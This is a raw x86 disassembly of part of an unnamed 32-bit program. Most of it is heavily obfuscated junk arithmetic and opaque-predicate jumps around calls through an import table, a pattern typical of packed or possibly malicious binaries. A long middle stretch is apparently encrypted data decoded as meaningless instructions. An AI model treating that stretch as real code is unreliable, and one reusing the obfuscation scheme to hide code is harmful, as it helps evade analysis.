  41f98d:	add    ecx,ecx
  41f98f:	and    DWORD PTR ds:0x42824f,0x6064
  41f999:	or     ecx,0x4aaa
  41f99f:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41f9a6:	mov    DWORD PTR [ebp-0x100],0x49f7
  41f9b0:	xor    ecx,eax
  41f9b2:	mov    eax,DWORD PTR [ebp-0x100]
  41f9b8:	movzx  ecx,WORD PTR ds:0x428153
  41f9bf:	or     DWORD PTR ds:0x42833f,ecx
  41f9c5:	add    eax,0x7b60
  41f9ca:	cmp    DWORD PTR ds:0x4282b7,0x0
  41f9d1:	mov    DWORD PTR ds:0x4281fb,0x756d
  41f9db:	mov    DWORD PTR ds:0x4282b3,0x1d60
  41f9e5:	jmp    0x41fa41
  41f9ea:	mov    ecx,DWORD PTR ds:0x4282bb
  41f9f0:	cmp    DWORD PTR ds:0x4282b7,0x0
  41f9f7:	jg     0x41fa21
  41f9fd:	push   0x59e0
  41fa02:	call   DWORD PTR ds:0x428df4
  41fa08:	adc    DWORD PTR ds:0x42834f,ebx
  41fa0e:	sbb    DWORD PTR ds:0x4282d3,ebx
  41fa14:	movzx  ecx,WORD PTR ds:0x42832b
  41fa1b:	add    DWORD PTR ds:0x42833b,ecx
  41fa21:	add    DWORD PTR ds:0x428333,0x77eb
  41fa2b:	or     DWORD PTR ds:0x4282b3,0x2dfb
  41fa35:	mov    ecx,DWORD PTR ds:0x42825f
  41fa3b:	and    DWORD PTR ds:0x42811f,ecx
  41fa41:	imul   eax,eax,0x5ea
  41fa47:	mov    ecx,DWORD PTR [ebp-0x6c]
  41fa4a:	add    DWORD PTR ds:0x42820b,0x42814b
  41fa54:	imul   eax,ecx
  41fa57:	xor    edx,edx
  41fa59:	mov    ecx,0x3218d
  41fa5e:	div    ecx
  41fa60:	or     DWORD PTR ds:0x428253,edx
  41fa66:	sub    eax,0x24c1
  41fa6b:	mov    DWORD PTR [ebp-0xa8],eax
  41fa71:	cmp    DWORD PTR ds:0x428237,0x0
  41fa78:	mov    ecx,0x571f
  41fa7d:	mov    DWORD PTR ds:0x4282c7,edi
  41fa83:	jmp    0x41faef
  41fa88:	mov    eax,ds:0x428157
  41fa8d:	mov    DWORD PTR ds:0x42814f,0x4079
  41fa97:	cmp    DWORD PTR ds:0x428237,0x0
  41fa9e:	jb     0x41fac8
  41faa4:	push   0x428043
  41faa9:	push   DWORD PTR [ebp-0xc]
  41faac:	call   DWORD PTR ds:0x428df8
  41fab2:	adc    ecx,ecx
  41fab4:	dec    ecx
  41fab5:	movzx  ecx,BYTE PTR ds:0x428113
  41fabc:	sbb    ecx,DWORD PTR ds:0x42820b
  41fac2:	mov    DWORD PTR ds:0x428113,ecx
  41fac8:	xor    DWORD PTR ds:0x42825b,edx
  41face:	movzx  ecx,WORD PTR ds:0x428213
  41fad5:	or     DWORD PTR ds:0x4282ab,ecx
  41fadb:	xor    ecx,ecx
  41fadd:	add    ecx,DWORD PTR ds:0x42833b
  41fae3:	add    DWORD PTR ds:0x42824f,ecx
  41fae9:	and    ecx,DWORD PTR ds:0x42812b
  41faef:	mov    DWORD PTR [ebp-0x84],0x2c40
  41faf9:	cmp    DWORD PTR ds:0x42815b,0x0
  41fb00:	mov    ecx,DWORD PTR ds:0x4282bf
  41fb06:	mov    DWORD PTR ds:0x428343,edx
  41fb0c:	mov    DWORD PTR ds:0x42811f,ebx
  41fb12:	mov    DWORD PTR ds:0x4282c7,0x3231
  41fb1c:	jmp    0x41fb72
  41fb21:	not    eax
  41fb23:	cmp    DWORD PTR ds:0x42815b,0x0
  41fb2a:	jne    0x41fb54
  41fb30:	push   0x4d84
  41fb35:	push   0x8040
  41fb3a:	call   DWORD PTR ds:0x428dfc
  41fb40:	and    ecx,ecx
  41fb42:	mov    ecx,DWORD PTR ds:0x428363
  41fb48:	or     ecx,DWORD PTR ds:0x428233
  41fb4e:	mov    DWORD PTR ds:0x428363,ecx
  41fb54:	mov    ecx,DWORD PTR ds:0x42812b
  41fb5a:	add    ecx,DWORD PTR ds:0x428363
  41fb60:	mov    DWORD PTR ds:0x42812b,ecx
  41fb66:	sbb    DWORD PTR ds:0x42824b,ecx
  41fb6c:	adc    ecx,DWORD PTR ds:0x42825f
  41fb72:	mov    DWORD PTR [ebp-0x18],0x6013
  41fb79:	xor    ecx,DWORD PTR ds:0x42820f
  41fb7f:	mov    DWORD PTR [ebp-0x80],0xc
  41fb86:	or     DWORD PTR ds:0x428217,ecx
  41fb8c:	mov    eax,DWORD PTR [ebp-0x18]
  41fb8f:	sub    DWORD PTR ds:0x42814f,edi
  41fb95:	mov    ecx,DWORD PTR [ebp-0x80]
  41fb98:	or     DWORD PTR ds:0x428247,0x42824b
  41fba2:	xor    edx,edx
  41fba4:	xor    DWORD PTR ds:0x42835b,0x4282c3
  41fbae:	div    ecx
  41fbb0:	imul   eax,eax,0x4312
  41fbb6:	add    eax,0x5abe
  41fbbb:	cmp    DWORD PTR ds:0x42832f,0x0
  41fbc2:	mov    DWORD PTR ds:0x42815b,ebx
  41fbc8:	mov    DWORD PTR ds:0x428367,0x6142
  41fbd2:	jmp    0x41fc37
  41fbd7:	mov    DWORD PTR ds:0x428237,0x13f4
  41fbe1:	mov    DWORD PTR ds:0x428137,0x47aa
  41fbeb:	cmp    DWORD PTR ds:0x42832f,0x0
  41fbf2:	jne    0x41fc15
  41fbf8:	push   0x42809f
  41fbfd:	call   DWORD PTR ds:0x428e00
  41fc03:	and    ecx,DWORD PTR ds:0x428223
  41fc09:	adc    DWORD PTR ds:0x4282b3,ecx
  41fc0f:	sub    DWORD PTR ds:0x4282bb,edi
  41fc15:	mov    ecx,DWORD PTR ds:0x42832b
  41fc1b:	sbb    ecx,DWORD PTR ds:0x4281eb
  41fc21:	mov    DWORD PTR ds:0x42832b,ecx
  41fc27:	and    DWORD PTR ds:0x4282d3,0x55d2
  41fc31:	add    DWORD PTR ds:0x42814f,ecx
  41fc37:	mov    ecx,DWORD PTR [ebp-0x84]
  41fc3d:	adc    DWORD PTR ds:0x42823f,0x1028
  41fc47:	xor    eax,ecx
  41fc49:	or     ecx,DWORD PTR ds:0x42824f
  41fc4f:	xor    edx,edx
  41fc51:	or     ecx,DWORD PTR ds:0x42811b
  41fc57:	mov    ecx,0x5ae
  41fc5c:	sub    DWORD PTR ds:0x428237,0x4356
  41fc66:	div    ecx
  41fc68:	cmp    DWORD PTR ds:0x4281ef,0x0
  41fc6f:	mov    ecx,0x1d02
  41fc74:	mov    DWORD PTR ds:0x428253,ebx
  41fc7a:	mov    DWORD PTR ds:0x428267,0x2746
  41fc84:	mov    DWORD PTR ds:0x428237,edx
  41fc8a:	jmp    0x41fcee
  41fc8f:	mov    DWORD PTR ds:0x42812b,0x6e43
  41fc99:	cmp    DWORD PTR ds:0x4281ef,0x0
  41fca0:	jbe    0x41fccb
  41fca6:	push   0x29e8
  41fcab:	push   0x54b0
  41fcb0:	push   DWORD PTR [ebp-0x28]
  41fcb3:	call   DWORD PTR ds:0x428e74
  41fcb9:	neg    ecx
  41fcbb:	sbb    ecx,DWORD PTR ds:0x428363
  41fcc1:	and    DWORD PTR ds:0x42812b,0x4282df
  41fccb:	mov    ecx,DWORD PTR ds:0x428133
  41fcd1:	xor    DWORD PTR ds:0x4281ff,ecx
  41fcd7:	movzx  ecx,BYTE PTR ds:0x428247
  41fcde:	sub    DWORD PTR ds:0x428353,ecx
  41fce4:	mov    DWORD PTR ds:0x428203,0x7a81
  41fcee:	xor    eax,0x5e8c
  41fcf3:	adc    ecx,0x10d9
  41fcf9:	mov    DWORD PTR [ebp-0x48],eax
  41fcfc:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41fd06:	mov    eax,ds:0x428367
  41fd0b:	add    eax,DWORD PTR ds:0x42812f
  41fd11:	mov    ds:0x428367,eax
  41fd16:	mov    DWORD PTR [ebp-0x138],0x1169
  41fd20:	xor    ecx,ecx
  41fd22:	mov    DWORD PTR [ebp-0x12c],0x1379
  41fd2c:	cmp    DWORD PTR ds:0x4282d3,0x0
  41fd33:	mov    ecx,DWORD PTR ds:0x4282bb
  41fd39:	mov    ecx,DWORD PTR ds:0x42834b
  41fd3f:	mov    ecx,0x2973
  41fd44:	movzx  ecx,WORD PTR ds:0x4281eb
  41fd4b:	jmp    0x41fd9c
  41fd50:	mov    eax,0x21a8
  41fd55:	mov    eax,0x38ee
  41fd5a:	cmp    DWORD PTR ds:0x4282d3,0x0
  41fd61:	ja     0x41fd84
  41fd67:	push   DWORD PTR [ebp-0x20]
  41fd6a:	call   DWORD PTR ds:0x428e04
  41fd70:	and    ecx,ecx
  41fd72:	xor    DWORD PTR ds:0x428233,0x6e97
  41fd7c:	add    ecx,ecx
  41fd7e:	or     DWORD PTR ds:0x42820f,edx
  41fd84:	mov    ecx,DWORD PTR ds:0x428273
  41fd8a:	mov    ecx,DWORD PTR [ecx]
  41fd8c:	sbb    DWORD PTR ds:0x42825f,ecx
  41fd92:	sbb    DWORD PTR ds:0x428353,0x4282db
  41fd9c:	mov    eax,DWORD PTR [ebp-0x12c]
  41fda2:	mov    ecx,0x5856
  41fda7:	sub    ecx,eax
  41fda9:	shr    ecx,0x2
  41fdac:	sub    ecx,0x5be6
  41fdb2:	xor    eax,0xe7a
  41fdb7:	mov    eax,DWORD PTR [ebp-0x138]
  41fdbd:	imul   ecx,eax
  41fdc0:	mov    eax,DWORD PTR [ebp-0x13c]
  41fdc6:	sbb    DWORD PTR ds:0x4282cf,0x4282d3
  41fdd0:	and    ecx,eax
  41fdd2:	xor    DWORD PTR ds:0x42813f,edx
  41fdd8:	mov    eax,0x3b18
  41fddd:	sub    eax,ecx
  41fddf:	mov    DWORD PTR [ebp-0xfc],eax
  41fde5:	mov    DWORD PTR [ebp-0x28],0x16d7
  41fdec:	mov    DWORD PTR [ebp-0x134],0x6b4
  41fdf6:	sub    eax,DWORD PTR ds:0x42832f
  41fdfc:	mov    eax,DWORD PTR [ebp-0x134]
  41fe02:	xor    ecx,0x2b1a
  41fe08:	or     eax,0x4f70
  41fe0d:	xor    ecx,ecx
  41fe0f:	add    ecx,DWORD PTR ds:0x42832f
  41fe15:	xor    DWORD PTR ds:0x428337,ecx
  41fe1b:	mov    ecx,DWORD PTR [ebp-0x28]
  41fe1e:	or     eax,ecx
  41fe20:	sub    eax,0x5ff7
  41fe25:	mov    DWORD PTR [ebp-0xc8],eax
  41fe2b:	adc    eax,ecx
  41fe2d:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41fe37:	sub    ecx,ecx
  41fe39:	mov    DWORD PTR [ebp-0xc4],0x6236
  41fe43:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41fe4a:	cmp    DWORD PTR ds:0x42812f,0x0
  41fe51:	not    DWORD PTR ds:0x42825b
  41fe57:	mov    DWORD PTR ds:0x4281f7,edx
  41fe5d:	jmp    0x41feb6
  41fe62:	mov    eax,0x4320
  41fe67:	cmp    DWORD PTR ds:0x42812f,0x0
  41fe6e:	jne    0x41fe8d
  41fe74:	push   DWORD PTR [ebp-0x28]
  41fe77:	call   DWORD PTR ds:0x428e08
  41fe7d:	and    DWORD PTR ds:0x428347,0x4195
  41fe87:	add    ecx,DWORD PTR ds:0x4281ff
  41fe8d:	movzx  ecx,WORD PTR ds:0x4282d7
  41fe94:	and    DWORD PTR ds:0x4282b3,ecx
  41fe9a:	and    DWORD PTR ds:0x428227,edx
  41fea0:	add    ecx,0x2485
  41fea6:	mov    eax,ds:0x42816b
  41feab:	mov    ecx,DWORD PTR ds:0x42839f
  41feb1:	sub    ecx,eax
  41feb3:	and    eax,DWORD PTR [eax+ecx*1]
  41feb6:	mov    DWORD PTR [ebp-0x128],0x7537
  41fec0:	not    ecx
  41fec2:	mov    DWORD PTR [ebp-0x114],0x6985
  41fecc:	movzx  ecx,BYTE PTR ds:0x42814f
  41fed3:	or     DWORD PTR ds:0x428363,ecx
  41fed9:	mov    DWORD PTR [ebp-0x14],0x5627
  41fee0:	cmp    DWORD PTR ds:0x42822b,0x0
  41fee7:	mov    ecx,0x306f
  41feec:	mov    DWORD PTR ds:0x42832f,0x1b86
  41fef6:	jmp    0x41ff30
  41fefb:	mov    eax,0x6a49
  41ff00:	mov    DWORD PTR ds:0x4282ab,ecx
  41ff06:	cmp    DWORD PTR ds:0x42822b,0x0
  41ff0d:	jae    0x41ff28
  41ff13:	push   0x428113
  41ff18:	call   DWORD PTR ds:0x428e78
  41ff1e:	or     ecx,DWORD PTR ds:0x428133
  41ff24:	and    ecx,ecx
  41ff26:	adc    ecx,ecx
  41ff28:	adc    DWORD PTR ds:0x4282d7,ecx
  41ff2e:	sbb    ecx,ecx
  41ff30:	mov    DWORD PTR [ebp-0x64],0x72e7
  41ff37:	mov    eax,DWORD PTR [ebp-0x14]
  41ff3a:	and    DWORD PTR ds:0x4281fb,edi
  41ff40:	add    eax,DWORD PTR [ebp-0x64]
  41ff43:	jmp    0x42029f
  41ff48:	test   DWORD PTR [edx],edi
  41ff4a:	cmp    BYTE PTR [eax+0x2e],ah
  41ff4d:	pop    edx
  41ff4e:	cmp    eax,0x6ff09f1a
  41ff53:	mov    al,0x1b
  41ff55:	adc    ch,BYTE PTR cs:[edx+0x18162323]
  41ff5c:	mov    ds:0x79181812,eax
  41ff61:	add    DWORD PTR [esi],0x29
  41ff64:	and    DWORD PTR [esi+0x2ef18c65],ebx
  41ff6a:	fadd   DWORD PTR [eax+0x34]
  41ff6d:	ja     0x41ff6d
  41ff6f:	add    DWORD PTR [edx],ebx
  41ff71:	pop    ecx
  41ff72:	(bad)  
  41ff73:	daa    
  41ff74:	inc    esp
  41ff75:	sbb    eax,0xccd73779
  41ff7a:	or     al,0x86
  41ff7c:	outs   dx,BYTE PTR ds:[esi]
  41ff7d:	xor    DWORD PTR ds:0x87cce8a3,esi
  41ff83:	lods   eax,DWORD PTR ds:[esi]
  41ff84:	std    
  41ff85:	xchg   esi,eax
  41ff86:	in     al,dx
  41ff87:	aas    
  41ff88:	call   esp
  41ff8a:	mov    gs,esp
  41ff8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff8d:	dec    edi
  41ff8e:	add    al,0x94
  41ff90:	inc    ebp
  41ff91:	sbb    al,0xbb
  41ff93:	sub    edi,edx
  41ff95:	ret    0xd7ee
  41ff98:	add    bl,BYTE PTR [edi-0x4dc735fb]
  41ff9e:	mov    cl,0x12
  41ffa0:	pop    ebx
  41ffa1:	aas    
  41ffa2:	jmp    0x41ff87
  41ffa4:	repz std 
  41ffa6:	cdq    
  41ffa7:	sub    al,0x96
  41ffa9:	push   esi
  41ffaa:	xchg   edi,eax
  41ffab:	je     0x41ff32
  41ffad:	or     al,0x18
  41ffaf:	into   
  41ffb0:	lods   eax,DWORD PTR ds:[esi]
  41ffb1:	add    esp,DWORD PTR ds:[ecx]
  41ffb4:	icebp  
  41ffb5:	js     0x420003
  41ffb7:	add    ah,0xe7
  41ffba:	je     0x41ff81
  41ffbc:	or     BYTE PTR [esi+0x496eef6e],al
  41ffc2:	jmp    0x41ff4a
  41ffc4:	out    dx,al
  41ffc5:	mov    esi,0xa23a6334
  41ffca:	mov    esp,0x8fee52af
  41ffcf:	adc    al,0xf2
  41ffd1:	sub    al,0x3f
  41ffd3:	xlat   BYTE PTR ds:[ebx]
  41ffd4:	into   
  41ffd5:	adc    eax,0x62d7da75
  41ffda:	or     ah,BYTE PTR [eax-0x17040b8f]
  41ffe0:	push   eax
  41ffe1:	push   esp
  41ffe2:	je     0x41ffff
  41ffe4:	or     edx,DWORD PTR [ebx+0x243b1a97]
  41ffea:	cli    
  41ffeb:	je     0x41ff92
  41ffed:	push   ebp
  41ffee:	push   ss
  41ffef:	cmp    eax,0x6a755874
  41fff4:	jl     0x42004d
  41fff6:	ror    DWORD PTR [ecx],1
  41fff8:	add    al,0xd3
  41fffa:	ins    BYTE PTR es:[edi],dx
  41fffb:	mov    dh,0x9
  41fffd:	pop    ecx
  41fffe:	adc    edx,DWORD PTR [eax]
  420000:	call   0x19f588d
  420005:	cli    
  420006:	xor    al,bl
  420008:	xchg   edi,eax
  420009:	repz in eax,dx
  42000b:	and    esp,DWORD PTR [eax]
  42000d:	mov    cl,BYTE PTR [esi+0x0]
  420010:	sahf   
  420011:	cmp    al,0x8d
  420013:	test   al,0x46
  420015:	jb     0x420064
  420017:	add    al,0x4d
  420019:	pop    esp
  42001a:	cli    
  42001b:	push   edi
  42001c:	mov    edi,0x3f0bb7ae
  420021:	jmp    0x9d00:0x9b2544e9
  420028:	jecxz  0x420059
  42002a:	cld    
  42002b:	push   ss
  42002c:	or     bh,bh
  42002e:	rcr    BYTE PTR [edx-0x6a0e08de],0x9e
  420035:	and    ebx,0xffffffe7
  420038:	pop    esp
  420039:	mov    edx,?
  42003b:	mov    ch,0xaf
  42003d:	js     0x420073
  42003f:	add    ecx,edi
  420041:	retf   
  420042:	loopne 0x42005c
  420044:	mov    esi,esp
  420046:	sbb    al,0xda
  420048:	(bad)  
  420049:	mov    ch,BYTE PTR [ebx]
  42004b:	jne    0x42004e
  42004d:	push   edi
  42004e:	xchg   ebx,eax
  42004f:	sbb    DWORD PTR [ecx],ecx
  420051:	sbb    al,0xec
  420053:	pop    ebp
  420054:	int    0x12
  420056:	sbb    edx,DWORD PTR [edi]
  420058:	add    eax,0xadf0ff13
  42005d:	(bad)
  420062:	sbb    dh,BYTE PTR [edi+0x44460334]
  420068:	hlt    
  420069:	aam    0xdc
  42006b:	fstp   st(1)
  42006d:	out    dx,eax
  42006e:	mov    ecx,0x7c73d133
  420073:	sub    edi,DWORD PTR [edx]
  420075:	pushf  
  420076:	xchg   ebp,eax
  420077:	pop    edx
  420078:	mov    eax,0xfecfbdcb
  42007d:	sub    eax,esi
  42007f:	or     ecx,ecx
  420081:	clc    
  420082:	pcmpgtd mm3,QWORD PTR ds:0x312359db
  420089:	jg     0x42007a
  42008b:	xchg   ecx,eax
  42008c:	mov    al,ds:0x7a49f5ba
  420091:	mov    al,ds:0x9afcf06a
  420096:	repnz adc al,0xe3
  420099:	add    BYTE PTR [esp+eax*8],al
  42009c:	xchg   DWORD PTR [edi*1+0x49dad5e5],ebp
  4200a3:	adc    al,0xc0
  4200a5:	mov    cl,0xa8
  4200a7:	aaa    
  4200a8:	pop    ss
  4200a9:	push   ecx
  4200aa:	push   ss
  4200ab:	jno    0x420038
  4200ad:	out    dx,al
  4200ae:	mov    ebx,DWORD PTR [edi+eax*8-0x422407ef]
  4200b5:	mov    ebp,0x28fbe967
  4200ba:	pop    ds
  4200bb:	adc    ch,bh
  4200bd:	pop    ss
  4200be:	add    dh,BYTE PTR [edx-0x29d92862]
  4200c4:	outs   dx,BYTE PTR ds:[esi]
  4200c5:	fbstp  TBYTE PTR [esi+0x141f62da]
  4200cb:	pushf  
  4200cc:	dec    esi
  4200cd:	mov    ss,WORD PTR [eax-0xc]
  4200d0:	jo     0x42010e
  4200d2:	sbb    BYTE PTR ds:0xad31f871,ch
  4200d8:	aad    0xab
  4200da:	jb     0x420114
  4200dc:	call   0x9b2a:0x1b8fa3cf
  4200e3:	pusha  
  4200e4:	int3   
  4200e5:	stos   DWORD PTR es:[edi],eax
  4200e6:	xchg   ebx,eax
  4200e7:	daa    
  4200e8:	outs   dx,DWORD PTR ds:[esi]
  4200e9:	pusha  
  4200ea:	add    al,ah
  4200ec:	xor    dl,BYTE PTR [ecx+0x72]
  4200ef:	jmp    0xdca8cbfd
  4200f4:	fdiv   DWORD PTR fs:[esi]
  4200f7:	or     DWORD PTR [edx+0x1e94fec9],0x1b
  4200fe:	jp     0x42008d
  420100:	dec    ebp
  420101:	outs   dx,DWORD PTR ds:[esi]
  420102:	mov    DWORD PTR [ebp-0x11359648],esi
  420108:	addr16 jp 0x420162
  42010b:	adc    bl,BYTE PTR [eax]
  42010d:	(bad)  ds:0x46356228
  420113:	outs   dx,BYTE PTR ds:[esi]
  420114:	inc    esp
  420115:	sub    ch,BYTE PTR [ebx+0x73]
  420118:	loopne 0x4200ee
  42011a:	lock neg DWORD PTR [ebp-0x45aec5ff]
  420121:	fs cmp al,0xb3
  420124:	adc    ebp,0xffffffc3
  420127:	pop    ss
  420128:	dec    ebx
  420129:	and    eax,DWORD PTR [ecx-0x7a]
  42012c:	ret    0x660
  42012f:	push   edx
  420130:	xchg   edi,eax
  420131:	out    dx,al
  420132:	loope  0x420197
  420134:	and    ecx,DWORD PTR [ebx+0x3ea03fe6]
  42013a:	add    al,0xcd
  42013c:	sbb    ch,BYTE PTR ds:0xaa0bfbd5
  420142:	jne    0x42015b
  420144:	push   eax
  420145:	retf   
  420146:	push   ss
  420147:	mov    DWORD PTR [eax+eiz*1],esi
  42014a:	gs sbb eax,0x4d6a8e70
  420150:	sub    eax,0x77cb7251
  420155:	lds    eax,FWORD PTR [ebx]
  420157:	and    DWORD PTR [edx+ebx*1+0x16375ac5],ecx
  42015e:	lods   eax,DWORD PTR ds:[esi]
  42015f:	mov    cl,0x3b
  420161:	xchg   edx,eax
  420162:	push   0xffffffe1
  420164:	cmc    
  420165:	call   0x42b6d699
  42016a:	dec    ebp
  42016b:	sub    BYTE PTR [ecx-0x74db6b39],dh
  420171:	stos   DWORD PTR es:[edi],eax
  420172:	dec    ebx
  420173:	xchg   esp,eax
  420174:	test   eax,0x33124542
  420179:	lahf   
  42017a:	inc    esp
  42017b:	loope  0x4201e3
  42017d:	je     0x420134
  42017f:	out    0x64,eax
  420181:	xor    ch,0x45
  420184:	sbb    BYTE PTR [ebx-0x40],bl
  420187:	xchg   DWORD PTR [ecx],ebp
  420189:	test   DWORD PTR [eax-0x48],edx
  42018c:	es mov eax,0xa916c75
  420192:	push   edi
  420193:	jg     0x42016d
  420195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420196:	dec    edi
  420197:	fcmovb st,st(3)
  420199:	dec    ebp
  42019a:	inc    edi
  42019b:	or     eax,0x8e86b8f0
  4201a0:	das    
  4201a1:	xchg   esi,eax
  4201a2:	inc    edx
  4201a3:	push   ss
  4201a4:	cdq    
  4201a5:	enter  0x7f50,0x11
  4201a9:	loop   0x42014c
  4201ab:	sub    BYTE PTR [ecx],ah
  4201ad:	or     BYTE PTR [eax+eax*2+0x52],ch
  4201b1:	ins    BYTE PTR es:[edi],dx
  4201b2:	cdq    
  4201b3:	out    0x59,eax
  4201b5:	ret    0x5008
  4201b8:	cli    
  4201b9:	cwde   
  4201ba:	dec    ebx
  4201bb:	test   eax,0x43145b8
  4201c0:	sti    
  4201c1:	jmp    0x5731:0xbcebb98a
  4201c8:	iret   
  4201c9:	ins    DWORD PTR es:[edi],dx
  4201ca:	stos   DWORD PTR es:[edi],eax
  4201cb:	jns    0x42020a
  4201cd:	gs stc 
  4201cf:	xor    esi,DWORD PTR [edx-0x528b6739]
  4201d5:	inc    esi
  4201d6:	push   esi
  4201d7:	sub    eax,0xc75ae541
  4201dc:	push   edx
  4201dd:	add    BYTE PTR [edx+0x7b],al
  4201e0:	lock xor al,0x44
  4201e3:	and    al,0x1c
  4201e5:	push   es
  4201e6:	leave  
  4201e7:	pop    edx
  4201e8:	adc    al,0x21
  4201ea:	retf   
  4201eb:	jmp    0xc2874a6e
  4201f0:	mov    ch,0xda
  4201f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201f3:	popf   
  4201f4:	nop
  4201f5:	cmp    bl,dh
  4201f7:	sbb    eax,0xe864967d
  4201fc:	and    eax,DWORD PTR [ebp+eiz*4-0x4982d91a]
  420203:	jl     0x420231
  420205:	pop    esp
  420206:	imul   edx,DWORD PTR [ebx],0xae4253a0
  42020c:	fdivr  st,st(0)
  42020e:	mov    ecx,0x146ac378
  420213:	or     eax,0xb31031b1
  420218:	inc    ebp
  420219:	jmp    0x3d64:0xbb55c5a7
  420220:	enter  0xb0fd,0x3c
  420224:	push   ss
  420225:	xor    cl,dl
  420227:	or     DWORD PTR [eax],esi
  420229:	test   al,0xb4
  42022b:	call   0xd873:0x2eefad02
  420232:	in     al,0x1b
  420234:	sub    esp,DWORD PTR [ecx+edx*8+0x3a620b1b]
  42023b:	les    ebp,FWORD PTR [esi]
  42023d:	sbb    ah,BYTE PTR [ecx-0x48]
  420240:	push   esp
  420241:	daa    
  420242:	mov    edx,ds
  420244:	loop   0x42028a
  420246:	dec    esi
  420247:	fistp  DWORD PTR [edx+0x45]
  42024a:	push   esi
  42024b:	mov    cs,WORD PTR [ebp-0x65718e1]
  420251:	push   ebx
  420252:	adc    eax,0xf2a59f2
  420257:	mov    cl,0x15
  420259:	sub    BYTE PTR [ecx-0x6596efd5],al
  42025f:	test   al,0x3f
  420261:	sbb    DWORD PTR [edi+eiz*4-0x79],esi
  420265:	or     dl,BYTE PTR [esi]
  420267:	addr16 sub eax,0xd3680138
  42026d:	stos   DWORD PTR es:[edi],eax
  42026e:	jne    0x4202df
  420270:	fcmovnbe st,st(4)
  420272:	sub    eax,0xc1ef6c20
  420277:	repz mov esp,0x56dba30b
  42027d:	sub    ah,dl
  42027f:	ror    DWORD PTR [edi-0x6f],1
  420282:	jecxz  0x42024b
  420284:	xor    ch,cl
  420286:	mov    cl,0x6e
  420288:	test   DWORD PTR [esi-0x78],esi
  42028b:	jge    0x420276
  42028d:	sub    DWORD PTR [edx-0x17],edi
  420290:	mov    esi,0xd42aa303
  420295:	lock fld TBYTE PTR [ebp-0x47398e4e]
  42029d:	inc    eax
  42029e:	or     BYTE PTR [ebx-0x11373],0xff
  4202a5:	or     DWORD PTR ds:0x42824f,0x4282cb
  4202af:	sub    eax,ecx
  4202b1:	mov    ecx,DWORD PTR ds:0x428347
  4202b7:	add    DWORD PTR ds:0x4282cf,ecx
  4202bd:	mov    ecx,DWORD PTR [ebp-0x128]
  4202c3:	imul   eax,ecx
  4202c6:	imul   eax,eax,0xe4e
  4202cc:	mov    ecx,DWORD PTR [ebp-0x7c]
  4202cf:	or     eax,ecx
  4202d1:	and    DWORD PTR ds:0x42834b,ebx
  4202d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4202da:	sub    DWORD PTR ds:0x428127,0x428247
  4202e4:	lea    eax,[ecx+eax*1+0x46210209]
  4202eb:	add    DWORD PTR ds:0x42833b,0x42811f
  4202f5:	push   eax
  4202f6:	add    DWORD PTR ds:0x428233,0x4281eb
  420300:	call   0x414116
  420305:	cmp    DWORD PTR ds:0x4282cb,0x0
  42030c:	mov    DWORD PTR ds:0x428223,edx
  420312:	mov    esi,DWORD PTR ds:0x4281eb
  420318:	mov    DWORD PTR ds:0x4282c7,ebx
  42031e:	mov    DWORD PTR ds:0x4282d7,0x5564
  420328:	jmp    0x420388
  42032d:	mov    DWORD PTR ds:0x428143,0x3019
  420337:	not    DWORD PTR ds:0x4282cb
  42033d:	cmp    DWORD PTR ds:0x4282cb,0x0
  420344:	jae    0x42036f
  42034a:	push   DWORD PTR [ebp-0x24]
  42034d:	push   0x42832b
  420352:	push   DWORD PTR [ebp-0x1c]
  420355:	push   DWORD PTR [ebp-0xc]
  420358:	push   0x6e6a
  42035d:	call   DWORD PTR ds:0x428e7c
  420363:	adc    ecx,DWORD PTR ds:0x428203
  420369:	xor    DWORD PTR ds:0x4282bf,edx
  42036f:	add    ecx,esi
  420371:	mov    ecx,DWORD PTR ds:0x4281db
  420377:	mov    esi,DWORD PTR ds:0x428293
  42037d:	sub    esi,ecx
  42037f:	and    ecx,DWORD PTR [ecx+esi*1]
  420382:	sbb    DWORD PTR ds:0x428147,ecx
  420388:	mov    ecx,eax
  42038a:	mov    eax,DWORD PTR [ebp-0xc4]
  420390:	add    esi,0x7195
  420396:	imul   eax,eax,0x21b3
  42039c:	sbb    DWORD PTR ds:0x4282bb,ebx
  4203a2:	add    eax,DWORD PTR [ebp-0xe4]
  4203a8:	and    eax,0xd5c
  4203ad:	cmp    DWORD PTR ds:0x428337,0x0
  4203b4:	mov    DWORD PTR ds:0x42825f,ebx
  4203ba:	mov    esi,0x156a
  4203bf:	movzx  esi,WORD PTR ds:0x42815b
  4203c6:	jmp    0x420422
  4203cb:	mov    DWORD PTR ds:0x42821f,0x2dc
  4203d5:	mov    DWORD PTR ds:0x42821b,edi
  4203db:	cmp    DWORD PTR ds:0x428337,0x0
  4203e2:	jae    0x420410
  4203e8:	push   0x427faf
  4203ed:	call   DWORD PTR ds:0x428e80
  4203f3:	movzx  esi,WORD PTR ds:0x428137
  4203fa:	add    DWORD PTR ds:0x4282b7,esi
  420400:	adc    DWORD PTR ds:0x428157,ebx
  420406:	add    DWORD PTR ds:0x428333,0x22a2
  420410:	and    esi,DWORD PTR ds:0x428333
  420416:	or     DWORD PTR ds:0x42832f,ecx
  42041c:	sbb    esi,DWORD PTR ds:0x4282b3
  420422:	sub    eax,0x2e81
  420427:	cmp    DWORD PTR ds:0x428233,0x0
  42042e:	mov    DWORD PTR ds:0x428333,0x5615
  420438:	mov    DWORD PTR ds:0x42812b,0x419b
  420442:	mov    DWORD PTR ds:0x42814f,0x389d
  42044c:	not    DWORD PTR ds:0x428223
  420452:	jmp    0x4204b6
  420457:	mov    esi,0x7b57
  42045c:	cmp    DWORD PTR ds:0x428233,0x0
  420463:	je     0x4204a0
  420469:	push   0x4281ff
  42046e:	push   DWORD PTR [ebp-0x24]
  420471:	call   DWORD PTR ds:0x428e84
  420477:	sub    DWORD PTR ds:0x4282b7,0x6950
  420481:	movzx  esi,WORD PTR ds:0x42822b
  420488:	xor    esi,DWORD PTR ds:0x4282db
  42048e:	mov    DWORD PTR ds:0x42822b,esi
  420494:	mov    esi,DWORD PTR ds:0x428213
  42049a:	or     DWORD PTR ds:0x4282af,esi
  4204a0:	xor    DWORD PTR ds:0x4282df,ecx
  4204a6:	add    DWORD PTR ds:0x4282df,ebx
